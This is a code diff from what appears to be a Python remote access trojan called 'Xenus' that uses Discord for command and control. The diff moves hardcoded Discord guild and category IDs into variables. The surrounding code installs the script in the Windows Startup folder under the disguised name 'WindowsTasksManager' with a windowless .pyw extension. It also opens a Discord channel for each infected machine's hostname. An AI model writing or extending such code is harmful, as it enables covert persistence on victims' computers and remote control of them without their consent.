@@ -3,6 +3,8 @@ import os
 autostartup = True
 startupname = "WindowsTasksManager"
 statup_ext = "pyw"
+guild_id = 993120717019291721
+category_id = 993122405818044516
 
 def isinstartup():
     startup = os.getenv('appdata')+f'\Microsoft\Windows\Start Menu\Programs\Startup\{startupname}.{statup_ext}'
@@ -371,11 +373,11 @@ async def mainui(channel, msg):
 async def on_ready():
     try:
         chaname =  get_hostname().lower().replace(" ", "-")
-        guild = bot.get_guild(993120717019291721)
+        guild = bot.get_guild(guild_id)
         for channel in guild.channels:
             if str(chaname) in channel.name:
                 await channel.delete()
-        cat = discord.utils.get(guild.categories, id=993122405818044516)
+        cat = discord.utils.get(guild.categories, id=category_id)
         channel = await guild.create_text_channel(str(chaname), category=cat)
         mainmsg = await channel.send('Xenus Is Loading...')
         while True:
